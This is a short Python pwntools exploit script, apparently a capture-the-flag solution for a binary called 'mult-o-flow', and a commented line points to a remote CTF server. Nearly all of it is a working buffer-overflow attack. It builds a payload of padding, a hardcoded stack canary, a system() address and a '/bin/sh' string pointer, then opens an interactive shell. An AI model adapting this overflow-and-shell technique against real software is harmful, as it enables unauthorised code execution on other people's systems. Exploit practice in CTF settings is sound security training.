#!/usr/bin/python
from pwn import *
p=process('./mult-o-flow')
#p = remote('flatearth.fluxfingers.net', 1746)
context(arch='i386',log_level='debug')
def main():
	p.recvuntil('>')
	
	p.send('a'*62+'sh')
	canary=0x112233
	system_addr=0x48882
	s_addr=0x4b124+0xf8
	p.recvuntil('tables :-)\n')

	dest='z'*0x1000

	s='ISP:'+' '*9
	s=s.rjust(0x200,'s')

	v3='City:'+' '*9
	v3=v3.rjust(0x200-0xff,'3')
	v3='/bin/sh'.rjust(0xff,'a')+v3

	over='a'*4+p32(canary)[:-1]+'<'+'a'*0x10+p32(system_addr)[:-1]+'<'+p32(s_addr)[:-1]
	
	payload=dest+s+v3+over
	#gdb.attach(p,'b *0x48c53\nb *0x48a14')
	p.send(payload)
	p.interactive()
if __name__=='__main__':
	main()
